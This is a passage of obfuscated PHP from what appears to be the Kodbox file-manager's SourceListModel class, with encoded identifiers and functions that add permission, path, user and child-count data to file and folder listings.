$‘ƒÕÍ£ = $––›×©[$øÂ…Íá]; $‘ƒÕÍ£[$Ş­‚ùµ¿[90]] = $ß²Çô¥[$Ş­‚ùµ¿[90]]; $‘ƒÕÍ£[$Ş­‚ùµ¿[42]] = $ß²Çô¥[$Ş­‚ùµ¿[42]]; if (!$‘ƒÕÍ£[$Ş­‚ùµ¿[558]]) { Model($Ş­‚ùµ¿[555])->fileMd5Check($‘ƒÕÍ£); } if (!isset(self::$cacheFileInfo[$Ş­‚ùµ¿[559] . $øÂ…Íá])) { self::$cacheFileInfo[$Ş­‚ùµ¿[559] . $øÂ…Íá] = array_merge(array(), $‘ƒÕÍ£); } unset($––›×©[$øÂ…Íá][$Ş­‚ùµ¿[98]]); $üî¾Ìè• = isset($¦®ÍÎÚŒ[$øÂ…Íá]) && is_array($¦®ÍÎÚŒ[$øÂ…Íá]) ? $¦®ÍÎÚŒ[$øÂ…Íá] : array(); $ß²Çô¥[$Ş­‚ùµ¿[181]] = array_merge($üî¾Ìè•, $––›×©[$øÂ…Íá]); if (isset($ß²Çô¥[$Ş­‚ùµ¿[181]][$Ş­‚ùµ¿[195]])) { $ß²Çô¥[$Ş­‚ùµ¿[195]] = json_decode($ß²Çô¥[$Ş­‚ùµ¿[181]][$Ş­‚ùµ¿[195]], !0); unset($ß²Çô¥[$Ş­‚ùµ¿[181]][$Ş­‚ùµ¿[195]]); } } unset($ß²Çô¥); } protected function _listAppendSourceInfo(&$ÂÔËë‰ª, $äÇÜÓİ) { $¢½¬ãÅœ =& $_SERVER[ü¢ÙÊñÛ]; $Í§ÊŠÕµ = Model($¢½¬ãÅœ[560])->listData(); $º§ßÁá = Model($¢½¬ãÅœ[510])->listData(); $¢À¥Â³” = Model($¢½¬ãÅœ[500])->listData(); $¯ğ¬×í = Model($¢½¬ãÅœ[561])->listSimple(); $šê†æİû = array_to_keyvalue($Í§ÊŠÕµ, $¢½¬ãÅœ[486]); $§ª€Ùä¬ = array_to_keyvalue_group($º§ßÁá, $¢½¬ãÅœ[98], $¢½¬ãÅœ[511]); $˜ÄÊÌìë = array_to_keyvalue($¢À¥Â³”, $¢½¬ãÅœ[98]); $˜¥èÕÉ = array_to_keyvalue_group($¯ğ¬×í, $¢½¬ãÅœ[204]); foreach ($ÂÔËë‰ª as &$§Ñ±ÂÃì) { $§Ñ±ÂÃì[$¢½¬ãÅœ[101]] = array($¢½¬ãÅœ[562] => 0, $¢½¬ãÅœ[563] => 0, $¢½¬ãÅœ[564] => 0); if (isset($˜ÄÊÌìë[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]])) { $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[565]] = 1; $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[566]] = $˜ÄÊÌìë[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]][$¢½¬ãÅœ[42]]; } if ($§ª€Ùä¬ && $šê†æİû && isset($§ª€Ùä¬[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]])) { $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[567]] = array(); foreach ($§ª€Ùä¬[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]] as $¬÷ Í…) { $”“¯«” = $šê†æİû[$¬÷ Í…]; $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[567]][] = array($¢½¬ãÅœ[568] => $”“¯«”[$¢½¬ãÅœ[486]], $¢½¬ãÅœ[505] => $”“¯«”[$¢½¬ãÅœ[42]], $¢½¬ãÅœ[569] => $”“¯«”[$¢½¬ãÅœ[570]]); } } if ($˜¥èÕÉ && isset($˜¥èÕÉ[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]])) { $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[571]] = array(); foreach ($˜¥èÕÉ[$§Ñ±ÂÃì[$¢½¬ãÅœ[204]]] as $¨ŞÑ¯Ô—) { $ÙÚá«†¼ = $¢½¬ãÅœ[572]; if ($¨ŞÑ¯Ô—[$¢½¬ãÅœ[573]] == $¢½¬ãÅœ[102]) { $ÙÚá«†¼ .= $¢½¬ãÅœ[574]; } $§Ñ±ÂÃì[$¢½¬ãÅœ[101]][$¢½¬ãÅœ[571]] = array_field_key($¨ŞÑ¯Ô—, explode($¢½¬ãÅœ[60], $ÙÚá«†¼)); } } } unset($§Ñ±ÂÃì); return $ÂÔËë‰ª; } protected function _listAppendChildren(&$µÛ«ºÛ, $Åá¯…«‰) { $ÔÀğ±İ² =& $_SERVER[ü¢ÙÊñÛ]; $¡´É£Êú = array(); $ü¯Û¶“ = array($ÔÀğ±İ²[252] => 0, $ÔÀğ±İ²[253] => 0); foreach ($µÛ«ºÛ as &$÷®¨’÷À) { if (!$÷®¨’÷À[$ÔÀğ±İ²[496]]) { continue; } $¡´É£Êú[] = $÷®¨’÷À[$ÔÀğ±İ²[204]]; } unset($÷®¨’÷À); if (!$¡´É£Êú) { return; } $“Ëàş¦½ = array($ÔÀğ±İ²[203] => array($ÔÀğ±İ²[17], $¡´É£Êú), $ÔÀğ±İ²[516] => 0); $ÕêØ²·å = array($ÔÀğ±İ²[203], $ÔÀğ±İ²[496], $ÔÀğ±İ²[575] => $ÔÀğ±İ²[576]); $õŞÛ±Ã˜ = $this->field($ÕêØ²·å)->where($“Ëàş¦½)->group($ÔÀğ±İ²[577])->select(); $©Ñï¶ö® = array(); foreach ($õŞÛ±Ã˜ as $‰–«Ï´) { $®äËûı = $‰–«Ï´[$ÔÀğ±İ²[203]]; $´«ø×¦÷ = $‰–«Ï´[$ÔÀğ±İ²[496]] == $ÔÀğ±İ²[102] ? $ÔÀğ±İ²[253] : $ÔÀğ±İ²[252]; if (!isset($©Ñï¶ö®[$®äËûı])) { $©Ñï¶ö®[$®äËûı] = array($ÔÀğ±İ²[252] => 0, $ÔÀğ±İ²[253] => 0); } $©Ñï¶ö®[$®äËûı][$´«ø×¦÷] += $‰–«Ï´[$ÔÀğ±İ²[576]]; } foreach ($µÛ«ºÛ as &$÷®¨’÷À) { if (!$÷®¨’÷À[$ÔÀğ±İ²[496]]) { continue; } $»–øÉ = is_array($©Ñï¶ö®[$÷®¨’÷À[$ÔÀğ±İ²[204]]]) ? $©Ñï¶ö®[$÷®¨’÷À[$ÔÀğ±İ²[204]]] : $ü¯Û¶“; $÷®¨’÷À[$ÔÀğ±İ²[253]] = $»–øÉ[$ÔÀğ±İ²[253]]; $÷®¨’÷À[$ÔÀğ±İ²[252]] = $»–øÉ[$ÔÀğ±İ²[252]]; unset($÷®¨’÷À[$ÔÀğ±İ²[497]]); } unset($÷®¨’÷À); } protected function _listAppendAuth(&$‚ªÎÆª) { $½ƒ€ÂÄ» =& $_SERVER[ü¢ÙÊñÛ]; $õ¡Ç±¨ = array(); foreach ($‚ªÎÆª as $ğæ„‡¬ó) { if ($ğæ„‡¬ó[$½ƒ€ÂÄ»[201]] == self::TYPE_GROUP) { $õ¡Ç±¨[] = $ğæ„‡¬ó[$½ƒ€ÂÄ»[204]]; } } if (!$õ¡Ç±¨) { return; } $ÂßøÃßÔ = array_to_keyvalue($‚ªÎÆª, $½ƒ€ÂÄ»[204]); $ˆ¿±ŠõÔ = Model($½ƒ€ÂÄ»[578])->getSourceList($õ¡Ç±¨, $ÂßøÃßÔ); $„Ğ™üå¤ = KodUser::isRoot(); foreach ($‚ªÎÆª as $—°Óâôæ => &$ğæ„‡¬ó) { $ğæ„‡¬ó[$½ƒ€ÂÄ»[498]] = $ˆ¿±ŠõÔ[$ğæ„‡¬ó[$½ƒ€ÂÄ»[204]]]; if (!$ğæ„‡¬ó[$½ƒ€ÂÄ»[498]] && $ğæ„‡¬ó[$½ƒ€ÂÄ»[201]] == self::TYPE_GROUP) { $ğæ„‡¬ó[$½ƒ€ÂÄ»[498]] = Action($½ƒ€ÂÄ»[579])->pathGroupAuthMake($ğæ„‡¬ó[$½ƒ€ÂÄ»[580]]); if (!$ğæ„‡¬ó[$½ƒ€ÂÄ»[498]] && !$„Ğ™üå¤) { $ğæ„‡¬ó[$½ƒ€ÂÄ»[246]] = !1; $ğæ„‡¬ó[$½ƒ€ÂÄ»[245]] = !1; } } if ($ğæ„‡¬ó[$½ƒ€ÂÄ»[498]]) { $ğæ„‡¬ó[$½ƒ€ÂÄ»[246]] = AuthModel::authCheckEdit($ğæ„‡¬ó[$½ƒ€ÂÄ»[498]][$½ƒ€ÂÄ»[499]]); $ğæ„‡¬ó[$½ƒ€ÂÄ»[245]] = AuthModel::authCheckView($ğæ„‡¬ó[$½ƒ€ÂÄ»[498]][$½ƒ€ÂÄ»[499]]); } $this->groupPathDisplay($ğæ„‡¬ó); } unset($ğæ„‡¬ó); } public function _listAppendAuthSecret(&$¥ƒØ’ˆ‚) { $ÒÓ÷…ì‰ =& $_SERVER[ü¢ÙÊñÛ]; if (Model($ÒÓ÷…ì‰[519])->get($ÒÓ÷…ì‰[581]) != $ÒÓ÷…ì‰[102]) { return; } static $¡¤õöÍá = false; if (!$¡¤õöÍá) { $Ï­ğµ”Ë = Model($ÒÓ÷…ì‰[582]); $˜¨ğèô = Model($ÒÓ÷…ì‰[583]); $¡¤õöÍá = $˜¨ğèô->listData(); $¡¤õöÍá = array_to_keyvalue($¡¤õöÍá, $ÒÓ÷…ì‰[204]); $Ô š—ú = json_decode(Model($ÒÓ÷…ì‰[519])->get($ÒÓ÷…ì‰[584]), !0); $Ô š—ú = array_to_keyvalue($Ô š—ú, $ÒÓ÷…ì‰[486]); foreach ($¡¤õöÍá as $á¿‹¥… => $±üÖó¢Ï) { $Å‡é…· = $Ô š—ú[$±üÖó¢Ï[$ÒÓ÷…ì‰[585]]]; if (!$Å‡é…·) { $˜¨ğèô->remove($±üÖó¢Ï[$ÒÓ÷…ì‰[486]]); unset($¡¤õöÍá[$á¿‹¥…]); continue; } $«¥ÔÌ = $Ï­ğµ”Ë->listData($Å‡é…·[$ÒÓ÷…ì‰[498]]); if (!$«¥ÔÌ) { $˜¨ğèô->remove($±üÖó¢Ï[$ÒÓ÷…ì‰[486]]); unset($¡¤õöÍá[$á¿‹¥…]); continue; } $±üÖó¢Ï[$ÒÓ÷…ì‰[498]] = $«¥ÔÌ; $±üÖó¢Ï[$ÒÓ÷…ì‰[586]] = $Å‡é…·; $±üÖó¢Ï[$ÒÓ÷…ì‰[587]] = Model($ÒÓ÷…ì‰[588])->getInfoSimpleOuter($±üÖó¢Ï[$ÒÓ÷…ì‰[538]]); $¡¤õöÍá[$á¿‹¥…] = $±üÖó¢Ï; } } $Óœ÷Šäã = USER_ID; $ôê÷Æú• = array(); $›ŞÁ¼Åã = $this->_listAppendPath($ôê÷Æú•, !0); foreach ($¥ƒØ’ˆ‚ as $á¿‹¥… => &$±üÖó¢Ï) { if (!is_array($±üÖó¢Ï[$ÒÓ÷…ì‰[498]])) { continue; } if ($±üÖó¢Ï[$ÒÓ÷…ì‰[201]] != $ÒÓ÷…ì‰[589]) { continue; } if (isset($¡¤õöÍá[$±üÖó¢Ï[$ÒÓ÷…ì‰[204]]])) { $ÒÏÇßŒı = $¡¤õöÍá[$±üÖó¢Ï[$ÒÓ÷…ì‰[204]]]; if (!is_array($±üÖó¢Ï[$ÒÓ÷…ì‰[550]])) { $±üÖó¢Ï[$ÒÓ÷…ì‰[550]] = array(); } $±üÖó¢Ï[$ÒÓ÷…ì‰[550]][$ÒÓ÷…ì‰[590]] = $ÒÏÇßŒı[$ÒÓ÷…ì‰[585]]; $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[591]] = $ÒÏÇßŒı; $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[592]] = $±üÖó¢Ï[$ÒÓ÷…ì‰[593]]; $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[594]] = $ÒÓ÷…ì‰[102]; if ($ÒÏÇßŒı[$ÒÓ÷…ì‰[538]] != $Óœ÷Šäã) { $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[499]] = $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[499]] & $ÒÏÇßŒı[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[498]]; } continue; } $óŠçêà¦ = $this->parentLevelArray($±üÖó¢Ï[$ÒÓ÷…ì‰[595]]); $³„éÔô = array_reverse($óŠçêà¦); foreach ($³„éÔô as $²¸êÏÕ£ => $Âî¹óƒ) { if (!isset($¡¤õöÍá[$Âî¹óƒ])) { continue; } $ÒÏÇßŒı = $¡¤õöÍá[$Âî¹óƒ]; $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[591]] = $ÒÏÇßŒı; if ($ÒÏÇßŒı[$ÒÓ÷…ì‰[538]] != $Óœ÷Šäã) { $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[499]] = $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[499]] & $ÒÏÇßŒı[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[498]]; } $ìÔ”êú› = $ÒÓ÷…ì‰[22]; $•¬ßÆÁ = count($óŠçêà¦) - $²¸êÏÕ£; for ($œ¹¹–İÊ = 0; $œ¹¹–İÊ < $•¬ßÆÁ; $œ¹¹–İÊ++) { if (!isset($›ŞÁ¼Åã[$óŠçêà¦[$œ¹¹–İÊ]])) { $ìÔ”êú› = $ÒÓ÷…ì‰[22]; break; } $ìÔ”êú› = $ìÔ”êú› . rtrim($›ŞÁ¼Åã[$óŠçêà¦[$œ¹¹–İÊ]], $ÒÓ÷…ì‰[18]) . $ÒÓ÷…ì‰[18]; } $±üÖó¢Ï[$ÒÓ÷…ì‰[498]][$ÒÓ÷…ì‰[592]] = rtrim($ìÔ”êú›, $ÒÓ÷…ì‰[18]) . $ÒÓ÷…ì‰[18]; break; } } unset($±üÖó¢Ï); } public function groupPathDisplay(&$Ø¡ª‘âì) { $Æ†ÉÃÌì =& $_SERVER[ü¢ÙÊñÛ]; if ($Ø¡ª‘âì[$Æ†ÉÃÌì[201]] != self::TYPE_GROUP) { return; } $Ô¶æô®“ = Model($Æ†ÉÃÌì[596])->getInfo($Ø¡ª‘âì[$Æ†ÉÃÌì[580]]); $ºğåä¡½ = $this->parentLevelArray($Ô¶æô®“[$Æ†ÉÃÌì[595]]); $¬‡ŠğšĞ = $Æ†ÉÃÌì[22]; foreach ($ºğåä¡½ as $å¥ÜÄ³ô) { $Ì«ÏèÅŠ = Model($Æ†ÉÃÌì[596])->getInfo($å¥ÜÄ³ô); $¬‡ŠğšĞ .= $Ì«ÏèÅŠ[$Æ†ÉÃÌì[101]][$Æ†ÉÃÌì[204]] . $Æ†ÉÃÌì[60]; } $Ø¡ª‘âì[$Æ†ÉÃÌì[597]] = $Ô¶æô®“[$Æ†ÉÃÌì[203]]; $Ø¡ª‘âì[$Æ†ÉÃÌì[598]] = $Ô¶æô®“[$Æ†ÉÃÌì[595]]; $Ø¡ª‘âì[$Æ†ÉÃÌì[599]] = $Ô¶æô®“[$Æ†ÉÃÌì[600]]; $Ø¡ª‘âì[$Æ†ÉÃÌì[601]] = $¬‡ŠğšĞ . $Ô¶æô®“[$Æ†ÉÃÌì[101]][$Æ†ÉÃÌì[204]]; } protected function _listAppendPath(&$ÕßåØ…£, $£½ñ®ˆÜ = false) { $Íış‰±Ş =& $_SERVER[ü¢ÙÊñÛ]; static $¼æ ıß = array(); $š¤×¢à = array(); $åÆ†Û£ê = array(); if ($£½ñ®ˆÜ) { return $¼æ ıß; } foreach ($ÕßåØ…£ as &$Ò§ÅÀ) { $²›—ìÀÛ = $Ò§ÅÀ[$Íış‰±Ş[204]]; if ($Ò§ÅÀ[$Íış‰±Ş[496]] == $Íış‰±Ş[102] && $Ò§ÅÀ[$Íış‰±Ş[203]] != 0) { $¼æ ıß[$²›—ìÀÛ] = $Ò§ÅÀ[$Íış‰±Ş[42]]; } if ($Ò§ÅÀ[$Íış‰±Ş[496]] == $Íış‰±Ş[102] && $Ò§ÅÀ[$Íış‰±Ş[203]] == 0) { $¼æ ıß[$²›—ìÀÛ] = $this->_listAppendPathRoot($Ò§ÅÀ, array()); } if (isset($åÆ†Û£ê[$Ò§ÅÀ[$Íış‰±Ş[595]]])) { continue; } $åÆ†Û£ê[$Ò§ÅÀ[$Íış‰±Ş[595]]] = !0; $‰ÖïŒäÅ = $this->parentLevelArray($Ò§ÅÀ[$Íış‰±Ş[595]]); foreach ($‰ÖïŒäÅ as $ï¦¥ ôÎ => $İÄ‰¨‡Ë) { if (isset($¼æ ıß[$İÄ‰¨‡Ë])) { continue; } if ($ï¦¥ ôÎ == 0) { $¼æ ıß[$İÄ‰¨‡Ë] = $this->_listAppendPathRoot($Ò§ÅÀ, $‰ÖïŒäÅ); } if ($ï¦¥ ôÎ != 0) { $š¤×¢à[] = $İÄ‰¨‡Ë; } } } unset($Ò§ÅÀ); $š¤×¢à = array_unique($š¤×¢à); if (count($š¤×¢à) > 0) { $¬±´ÛøŒ = array($Íış‰±Ş[502] => array($Íış‰±Ş[503], $š¤×¢à)); if (count($š¤×¢à) == 1) { $Ï‘Ö‚‚ = $this->sourceInfo($š¤×¢à[0]); $öé£´ò¬ = is_array($Ï‘Ö‚‚) ? array($Ï‘Ö‚‚) : !1; } else { $öé£´ò¬ = $this->field($Íış‰±Ş[602])->where($¬±´ÛøŒ)->select(); } if (!$öé£´ò¬) { $öé£´ò¬ = array(); } foreach ($öé£´ò¬ as $¯¹¯¬°á) { $¼æ ıß[$¯¹¯¬°á[$Íış‰±Ş[204]]] = $¯¹¯¬°á[$Íış‰±Ş[42]]; } } $ìÍÁÂè’ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $°¯Äôâ… = array(); foreach ($ÕßåØ…£ as &$Ò§ÅÀ) { $¤¼º²¢ = $Ò§ÅÀ[$Íış‰±Ş[595]]; $ÀÊÇï = $Íış‰±Ş[22]; if (isset($°¯Äôâ…[$¤¼º²¢])) { $ÀÊÇï = $°¯Äôâ…[$¤¼º²¢]; } else { $‰ÖïŒäÅ = $this->parentLevelArray($Ò§ÅÀ[$Íış‰±Ş[595]]); foreach ($‰ÖïŒäÅ as $ï¦¥ ôÎ => $İÄ‰¨‡Ë) { if (isset($¼æ ıß[$İÄ‰¨‡Ë])) { $ÀÊÇï .= $¼æ ıß[$İÄ‰¨‡Ë] . $Íış‰±Ş[18]; } } $°¯Äôâ…[$¤¼º²¢] = $ÀÊÇï; } $ÀÊÇï .= $Ò§ÅÀ[$Íış‰±Ş[42]]; if ($Ò§ÅÀ[$Íış‰±Ş[496]] == $Íış‰±Ş[102]) { $ÀÊÇï .= $Íış‰±Ş[18]; } $Ò§ÅÀ[$Íış‰±Ş[593]] = str_replace($Íış‰±Ş[267], $Íış‰±Ş[18], $ÀÊÇï); if ($Ò§ÅÀ[$Íış‰±Ş[203]] == $Íış‰±Ş[241]) { $Ò§ÅÀ[$Íış‰±Ş[42]] = trim($¼æ ıß[$Ò§ÅÀ[$Íış‰±Ş[204]]], $Íış‰±Ş[18]); $Ò§ÅÀ[$Íış‰±Ş[593]] = $Ò§ÅÀ[$Íış‰±Ş[42]] . $Íış‰±Ş[18]; } if (intval($Ò§ÅÀ[$Íış‰±Ş[201]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ò§ÅÀ, $‰ÖïŒäÅ, $ìÍÁÂè’); } } unset($Ò§ÅÀ); return $ÕßåØ…£; } private function _listAppendPathRecycle(&$”©İåÆÇ, $ˆ÷¹¡ŒÍ, $Õïâ­Á¾) { $¤ĞâŒ¸§ =& $_SERVER[ü¢ÙÊñÛ]; if (!in_array($Õïâ­Á¾, $ˆ÷¹¡ŒÍ) && $”©İåÆÇ[$¤ĞâŒ¸§[204]] != $Õïâ­Á¾) { return; } $Š½õ‰†è = explode($¤ĞâŒ¸§[18], trim($”©İåÆÇ[$¤ĞâŒ¸§[593]], $¤ĞâŒ¸§[18])); $êˆÕ—· = implode($¤ĞâŒ¸§[18], array_slice($Š½õ‰†è, 2)); $”©İåÆÇ[$¤ĞâŒ¸§[593]] = $¤ĞâŒ¸§[18] . LNG($¤ĞâŒ¸§[603]) . $¤ĞâŒ¸§[18] . ltrim($êˆÕ—·, $¤ĞâŒ¸§[18]); $”©İåÆÇ[$¤ĞâŒ¸§[595]] = $¤ĞâŒ¸§[604] . implode($¤ĞâŒ¸§[60], array_slice($ˆ÷¹¡ŒÍ, 1)) . $¤ĞâŒ¸§[60]; if ($”©İåÆÇ[$¤ĞâŒ¸§[204]] == $Õïâ­Á¾) { $”©İåÆÇ[$¤ĞâŒ¸§[595]] = $¤ĞâŒ¸§[604]; $”©İåÆÇ[$¤ĞâŒ¸§[203]] = $¤ĞâŒ¸§[241]; $”©İåÆÇ[$¤ĞâŒ¸§[42]] = LNG($¤ĞâŒ¸§[603]); } $”©İåÆÇ[$¤ĞâŒ¸§[605]] = $¤ĞâŒ¸§[606]; } protected function _listAppendPathRoot(&$ñ‰†ˆØ¢, $½ä‡»Œ•) { $éşõÁóé =& $_SERVER[ü¢ÙÊñÛ]; static $‘ª…İÛ = false; static $×Àİ  = false; $†­Ó¼“ß = $éşõÁóé[22]; if ($ñ‰†ˆØ¢[$éşõÁóé[201]] == self::TYPE_USER) { if ($ñ‰†ˆØ¢[$éşõÁóé[580]] == USER_ID) { $†­Ó¼“ß = LNG($éşõÁóé[607]); if ($‘ª…İÛ === !1) { $¤”…ÎÉ¶ = Model($éşõÁóé[608])->getInfoFull(USER_ID); $‘ª…İÛ = _get($¤”…ÎÉ¶, $éşõÁóé[609], $éşõÁóé[22]); } if ($×Àİ  === !1) { $¤”…ÎÉ¶ = Model($éşõÁóé[608])->getInfoFull(USER_ID); $×Àİ  = _get($¤”…ÎÉ¶, $éşõÁóé[610], $éşõÁóé[22]); } if ($½ä‡»Œ• && $½ä‡»Œ•[0] == $‘ª…İÛ || !$½ä‡»Œ• && $ñ‰†ˆØ¢[$éşõÁóé[204]] == $‘ª…İÛ) { $†­Ó¼“ß = LNG($éşõÁóé[611]); $ñ‰†ˆØ¢[$éşõÁóé[612]] = $éşõÁóé[613]; } if ($½ä‡»Œ• && $½ä‡»Œ•[0] == $×Àİ  || !$½ä‡»Œ• && $ñ‰†ˆØ¢[$éşõÁóé[204]] == $×Àİ ) { $†­Ó¼“ß = $†­Ó¼“ß . $éşõÁóé[614] . LNG($éşõÁóé[615]); } if (!$½ä‡»Œ•) { $ñ‰†ˆØ¢[$éşõÁóé[42]] = $†­Ó¼“ß; } } else { $¤”…ÎÉ¶ = Model($éşõÁóé[608])->getInfoFull($ñ‰†ˆØ¢[$éşõÁóé[580]]); $Ûº¿ª¨Š = _get($¤”…ÎÉ¶, $éşõÁóé[610], $éşõÁóé[22]); $ñ‰†ˆØ¢[$éşõÁóé[616]] = Model($éşõÁóé[588])->getInfoSimpleOuter($ñ‰†ˆØ¢[$éşõÁóé[580]]); $†­Ó¼“ß = LNG($éşõÁóé[617]) . $éşõÁóé[187] . $ñ‰†ˆØ¢[$éşõÁóé[616]][$éşõÁóé[42]] . $éşõÁóé[189]; if ($½ä‡»Œ• && $½ä‡»Œ•[0] == $Ûº¿ª¨Š || !$½ä‡»Œ• && $ñ‰†ˆØ¢[$éşõÁóé[204]] == $Ûº¿ª¨Š) { $†­Ó¼“ß = LNG($éşõÁóé[617]) . $éşõÁóé[618] . $ñ‰†ˆØ¢[$éşõÁóé[616]][$éşõÁóé[42]] . $éşõÁóé[614] . LNG($éşõÁóé[615]) . $éşõÁóé[189]; } } } else { if ($ñ‰†ˆØ¢[$éşõÁóé[201]] == self::TYPE_GROUP) { $Œ¯Ïª¥´ = Model($éşõÁóé[596])->getInfoSimple($ñ‰†ˆØ¢[$éşõÁóé[580]]); $†­Ó¼“ß = $Œ¯Ïª¥´[$éşõÁóé[42]]; } else { if ($ñ‰†ˆØ¢[$éşõÁóé[201]] == self::TYPE_SYSTEM) { $†­Ó¼“ß = $éşõÁóé[619]; } } } $†­Ó¼“ß = $†­Ó¼“ß ? $éşõÁóé[18] . $†­Ó¼“ß . $éşõÁóé[18] : $éşõÁóé[18]; return $†­Ó¼“ß; } protected function _listAppendUser(&$Òû¶‹Ğ‘) { $°œ•­ =& $_SERVER[ü¢ÙÊñÛ]; $½ÛÑ¤·û = array_to_keyvalue($Òû¶‹Ğ‘, $°œ•­[22], $°œ•­[538]); $ã•Ñ†¹š = array_to_keyvalue($Òû¶‹Ğ‘, $°œ•­[22], $°œ•­[540]); $‚§Æµ = array_merge($½ÛÑ¤·û, $ã•Ñ†¹š); $û²§Ê²Ÿ = Model($°œ•­[608])->userListInfo($‚§Æµ); foreach ($Òû¶‹Ğ‘ as &$Ëğ‚«¼¹) { $‰áºĞì = $Ëğ‚«¼¹[$°œ•­[538]]; $Ëğ‚«¼¹[$°œ•­[538]] = $û²§Ê²Ÿ[$‰áºĞì] ? $û²§Ê²Ÿ[$‰áºĞì] : !1; $‰áºĞì = $Ëğ‚«¼¹[$°œ•­[540]]; $Ëğ‚«¼¹[$°œ•­[540]] = $û²§Ê²Ÿ[$‰áºĞì] ? $û²§Ê²Ÿ[$‰áºĞì] : !1; if (_get($Ëğ‚«¼¹, $°œ•­[620], 0)) { $èŞµ‹ä = $GLOBALS[$°œ•­[16]][$°œ•­[103]][$°œ•­[621]]; if ($Ëğ‚«¼¹[$°œ•­[550]][$°œ•­[622]] <= time() - $èŞµ‹ä) { $this->metaSet($Ëğ‚«¼¹[$°œ•­[204]], $°œ•­[623], null); $this->metaSet($Ëğ‚«¼¹[$°œ•­[204]], $°œ•­[622], null); unset($Ëğ‚«¼¹[$°œ•­[550]][$°œ•­[623]]); continue; } $Şâæ­ë« = $Ëğ‚«¼¹[$°œ•­[550]][$°œ•­[623]]; $Ëğ‚«¼¹[$°œ•­[550]][$°œ•­[624]] = Model($°œ•­[608])->getInfoSimpleOuter($Şâæ­ë«); } } unset($Ëğ‚«¼¹); } public function parentLevelArray($Ô™’—ç) { $ÄŠÀñ‘ã =& $_SERVER[ü¢ÙÊñÛ]; $Ô™’—ç = explode($ÄŠÀñ‘ã[60], trim($Ô™’—ç, $ÄŠÀñ‘ã[60])); return array_remove_value($Ô™’—ç, $ÄŠÀñ‘ã[241]); } public function listAll($éÀø ëŠ) { $¥‡¬ââŸ =& $_SERVER[ü¢ÙÊñÛ]; $‰«û–ô = $this->sourceInfo($éÀø ëŠ); $ÌÏøñ“¹ = array($¥‡¬ââŸ[625] => array($¥‡¬ââŸ[626], $‰«û–ô[$¥‡¬ââŸ[595]] . $éÀø ëŠ . $¥‡¬ââŸ[627]), $¥‡¬ââŸ[628] => 0); $Ã‰Ñ½ŠÀ = $¥‡¬ââŸ[629]; $—Å¦€İè = "\114\105\x46\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\151\x6f\137\x66\151\x6c\145\40\146\151\x6c\145\x20\157\156\40\163\157\x75\162\143\145\x2e\x66\x69\154\145\111\x44\40\x3d\40\x66\x69\154\x65\x2e\146\151\x6c\x65\x49\104"; $ÔıàƒŠ = $this->alias($¥‡¬ââŸ[530])->field($Ã‰Ñ½ŠÀ)->where($ÌÏøñ“¹)->join($—Å¦€İè)->select(); $this->_listAppendAuth($ÔıàƒŠ); $this->_listAppendUser($ÔıàƒŠ); $this->_listAppendPath($ÔıàƒŠ); $ÔıàƒŠ = array_to_keyvalue($ÔıàƒŠ, $¥‡¬ââŸ[204]); $éÙœë¢» = "\57{$‰«û–ô[$¥‡¬ââŸ[42]]}\x2f"; $éÙœë¢» = $éÙœë¢» == $¥‡¬ââŸ[267] ? $¥‡¬ââŸ[18] : $éÙœë¢»; $Š”…‚‘Õ = array(); foreach ($ÔıàƒŠ as $”üµôÏ => $Á‚ÒÀÌ£) { $»íÂÑÆ = $this->parentLevelArray($Á‚ÒÀÌ£[$¥‡¬ââŸ[595]]); array_shift($»íÂÑÆ); $Š×ãÊœŸ = $éÙœë¢»; for ($°Å˜œš = 0; $°Å˜œš < count($»íÂÑÆ); $°Å˜œš++) { $Š×ãÊœŸ .= $ÔıàƒŠ[$»íÂÑÆ[$°Å˜œš]][$¥‡¬ââŸ[42]] . $¥‡¬ââŸ[18]; } $Š×ãÊœŸ .= $Á‚ÒÀÌ£[$¥‡¬ââŸ[42]]; if ($Á‚ÒÀÌ£[$¥‡¬ââŸ[496]]) { $Š×ãÊœŸ .= $¥‡¬ââŸ[18]; } $ƒû©µ±¶ = array($¥‡¬ââŸ[506] => str_replace($¥‡¬ââŸ[267], $¥‡¬ââŸ[18], str_replace($¥‡¬ââŸ[267], $¥‡¬ââŸ[18], str_replace($¥‡¬ââŸ[267], $¥‡¬ââŸ[18], $Š×ãÊœŸ))), $¥‡¬ââŸ[630] => intval($Á‚ÒÀÌ£[$¥‡¬ââŸ[496]]), $¥‡¬ââŸ[631] => intval($Á‚ÒÀÌ£[$¥‡¬ââŸ[90]]), $¥‡¬ââŸ[99] => intval($Á‚ÒÀÌ£[$¥‡¬ââŸ[99]]), $¥‡¬ââŸ[101] => $this->pathInfoFilter($Á‚ÒÀÌ£)); if (!$ƒû©µ±¶[$¥‡¬ââŸ[496]]) { $ƒû©µ±¶[$¥‡¬ââŸ[552]] = $Á‚ÒÀÌ£[$¥‡¬ââŸ[552]]; } $Š”…‚‘Õ[] = $ƒû©µ±¶; } $Š”…‚‘Õ = array_sort_by($Š”…‚‘Õ, $¥‡¬ââŸ[98]); return $Š”…‚‘Õ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource 